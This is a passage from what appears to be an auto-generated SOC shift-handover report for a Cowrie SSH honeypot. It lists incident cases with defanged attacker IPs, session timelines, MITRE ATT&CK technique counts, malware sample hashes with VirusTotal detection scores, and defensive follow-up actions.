- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a9df54d5a6b

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-04-11 08:37 |
| **Last Seen** | 2026-04-11 08:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:37:01` | `cowrie.session.connect` |
| `2026-04-11 08:37:01` | `cowrie.client.version` |
| `2026-04-11 08:37:01` | `cowrie.client.kex` |
| `2026-04-11 08:37:02` | `cowrie.login.success` |
| `2026-04-11 08:37:03` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e3b89b7877c

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]148` |
| **First Seen** | 2026-04-11 08:37 |
| **Last Seen** | 2026-04-11 08:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:37:04` | `cowrie.session.connect` |
| `2026-04-11 08:37:04` | `cowrie.client.version` |
| `2026-04-11 08:37:04` | `cowrie.client.kex` |
| `2026-04-11 08:37:06` | `cowrie.login.success` |
| `2026-04-11 08:37:06` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]148` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.174.236[.]9` | **2** | 2026-04-11 07:40 | 2026-04-11 07:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `49.247.36[.]49` | **2** | 2026-04-11 07:16 | 2026-04-11 07:25 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `64.227.109[.]89` | **2** | 2026-04-11 06:59 | 2026-04-11 06:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.94.5[.]43` | 1 | 2026-04-11 07:56 | 2026-04-11 07:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-04-11 07:55 | 2026-04-11 07:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.148.187[.]172` | 1 | 2026-04-11 08:11 | 2026-04-11 08:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.123.149[.]155` | 1 | 2026-04-11 07:03 | 2026-04-11 07:03 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.124.147[.]107` | 1 | 2026-04-11 07:53 | 2026-04-11 07:53 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.94.5[.]43` | CN | United-Communications-Network-Technology-Co-Ltd, GuangZhou | **100** ⚠️ | 50 |
| `190.117.96[.]174` | PE | America Movil Peru S.A.C. | **100** ⚠️ | 50 |
| `2.123.149[.]155` | GB | Sky UK Limited | **100** ⚠️ | 0 |
| `116.113.241[.]82` | CN | InnerMongoliaAlashanZXHB52MH01huawei3 | **100** ⚠️ | 35 |
| `103.93.37[.]178` | IN | Ngc Broadband Pvt. Ltd. | **100** ⚠️ | 50 |
| `213.103.113[.]159` | LT | Mobile Services Lithuania | **100** ⚠️ | 10 |
| `172.174.236[.]9` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `102.90.34[.]90` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `95.79.108[.]51` | RU | JSC ER-Telecom Holding Nizhny Novgorod branch | **100** ⚠️ | 50 |
| `83.134.195[.]54` | BE | Proximus NV/SA | **100** ⚠️ | 21 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 51 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 42 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |
| [T1057](https://attack.mitre.org/techniques/T1057) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 60 cases |
| Tool 34  | Credential Extractor        | ✅ 46 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 50 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (11.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 35 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 42 priority case(s) shown individually · 8 recon entry/entries in table (3 group(s) consolidating 6 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-11T08:40:32Z_
